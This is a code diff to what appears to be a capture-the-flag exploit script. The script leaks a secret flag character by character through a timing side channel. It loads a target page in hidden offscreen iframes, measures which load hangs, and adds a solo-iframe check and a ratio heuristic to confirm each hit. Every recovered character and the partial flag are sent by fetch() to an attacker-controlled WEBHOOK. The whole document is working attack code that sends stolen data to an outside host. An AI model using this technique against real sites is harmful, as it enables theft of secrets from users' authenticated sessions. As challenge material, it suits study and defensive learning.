@@ -9,7 +9,7 @@ const PREFIX   = "srdnlen{leakycs";   // <-- update this as you find chars
 const CHARSET  = "abcdefghijklmnopqrstuvwxyz_0123456789}";
 const ARRLEN   = 11;
 const DEPTH    = 7;
-const P_TO     = 900;   // ms — no-match loads ~200ms, match hangs to P_TO
+const P_TO     = 2500;  // ms — no-match ~300-500ms, match hangs full P_TO
 const BUDGET   = 54000; // ms total (bot has 60s, leave buffer)
 // ─────────────────────────────────────────────────────────────────────────────
 
@@ -86,14 +86,38 @@ async function run() {
     print(`[pos ${pos}] top3: ${top3}`);
 
     if (bestMs >= P_TO) {
-      // Timed out = definite match
-      flag += bestChar;
-      print(`[HIT] pos=${pos} char='${bestChar}' dt=${bestMs}ms  →  FLAG: ${flag}`);
-      fetch(`${WEBHOOK}?HIT&pos=${pos}&char=${encodeURIComponent(bestChar)}&flag=${encodeURIComponent(flag)}`).catch(()=>{});
-      if (bestChar === "}") break;
+      // Timed out in parallel scan — verify with a solo iframe to confirm
+      print(`[VERIFY] pos=${pos} candidate='${bestChar}' — running solo confirm...`);
+      const vMs = await new Promise(resolve => {
+        const f = document.createElement("iframe");
+        f.style = "width:1px;height:1px;position:fixed;top:-9999px;left:-9999px";
+        const t0 = Date.now();
+        const tid = setTimeout(() => { f.src="about:blank"; try{f.remove();}catch(e){} resolve(Date.now()-t0); }, P_TO);
+        f.onload = () => { clearTimeout(tid); try{f.remove();}catch(e){} resolve(Date.now()-t0); };
+        f.src = makeUrl(pos, bestChar);
+        document.body.appendChild(f);
+      });
+      print(`[VERIFY] pos=${pos} char='${bestChar}' solo=${vMs}ms`);
+
+      if (vMs >= P_TO) {
+        // Confirmed — real match
+        flag += bestChar;
+        print(`[HIT] pos=${pos} char='${bestChar}' confirmed=${vMs}ms  →  FLAG: ${flag}`);
+        fetch(`${WEBHOOK}?HIT&pos=${pos}&char=${encodeURIComponent(bestChar)}&flag=${encodeURIComponent(flag)}`).catch(()=>{});
+        if (bestChar === "}") break;
+      } else {
+        // False positive — network congestion caused it, try ratio
+        print(`[FALSE-POS] pos=${pos} char='${bestChar}' solo=${vMs}ms (too fast) — using ratio`);
+        if (bestMs / Math.max(1, secondMs) > 2.5) {
+          flag += bestChar;
+          print(`[HIT?] pos=${pos} char='${bestChar}' ratio=${(bestMs/Math.max(1,secondMs)).toFixed(1)}x  →  FLAG: ${flag}`);
+          fetch(`${WEBHOOK}?HIT_RATIO&pos=${pos}&char=${encodeURIComponent(bestChar)}&flag=${encodeURIComponent(flag)}`).catch(()=>{});
+          if (bestChar === "}") break;
+        }
+      }
     } else {
-      // Nothing timed out — try with ratio heuristic
-      if (bestMs > 400 && bestMs / Math.max(1, secondMs) > 2.5) {
+      // Nothing timed out — try ratio heuristic
+      if (bestMs > 600 && bestMs / Math.max(1, secondMs) > 3.0) {
         flag += bestChar;
         print(`[HIT?] pos=${pos} char='${bestChar}' ratio=${(bestMs/Math.max(1,secondMs)).toFixed(1)}x  →  FLAG: ${flag}`);
         fetch(`${WEBHOOK}?HIT_RATIO&pos=${pos}&char=${encodeURIComponent(bestChar)}&flag=${encodeURIComponent(flag)}`).catch(()=>{});
